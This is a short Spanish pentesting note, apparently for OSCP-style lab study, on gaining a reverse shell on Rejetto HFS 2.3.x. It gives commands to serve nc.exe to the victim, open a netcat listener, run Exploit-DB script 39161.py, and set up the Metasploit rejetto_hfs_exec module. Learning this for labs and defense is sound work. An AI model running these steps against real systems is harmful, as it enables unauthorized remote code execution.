---
title: Rejetto HttpFileServer - HFS (80)
pubDate: '2025-11-26'
---

## ¿Qué es Rejetto HFS?
**Rejetto HFS** es un servidor de archivos web ligero y portátil para Windows. Se utiliza para compartir archivos de forma rápida a través del navegador. Se identifica fácilmente por el pie de página que indica "HttpFileServer [Versión]".

### Riesgo principal
Las versiones **2.3.x** (como la 2.3, 2.3a y 2.3b) son vulnerables a una inyección de comandos en la búsqueda que permite obtener una shell reversa (RCE).

---

## 🔎 Enumeración
Si ves una interfaz web simple con una tabla de archivos, busca la versión en el footer. Si es 2.3, es vulnerable al exploit de **Null Byte Injection**.

---

## 🚀 Explotación Manual (Sin Metasploit)
Este método es el estándar en certificaciones como el OSCP. Requiere que la víctima pueda descargar el binario `nc.exe` desde tu máquina.

**1. Preparar archivos en tu Kali:**
```bash
# Copiar Netcat de Windows a tu carpeta actual
cp /usr/share/windows-resources/binaries/nc.exe .

# Levantar servidor para que la víctima descargue Netcat
python3 -m http.server 80
```

**2. Escuchar en tu Kali:**
```bash
nc -lvnp 4444
```

**3. Lanzar el exploit:**
Usa el exploit `39161.py` (disponible en Searchsploit).
```bash
# Nota: Suele requerir Python 2
python2 hfs_exploit.py <IP_VICTIMA> 80
```

---

## 🚀 Explotación con Metasploit
```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP_VICTIMA>
set LHOST <TU_IP>
run
```

---

## 💡 Tips Adicionales
*   **nc.exe:** Si el exploit manual no funciona, verifica que el servidor de la víctima tiene conexión con tu IP en el puerto 80.
*   **Falsos positivos:** A veces el servicio parece colgado pero el exploit funciona al segundo o tercer intento.
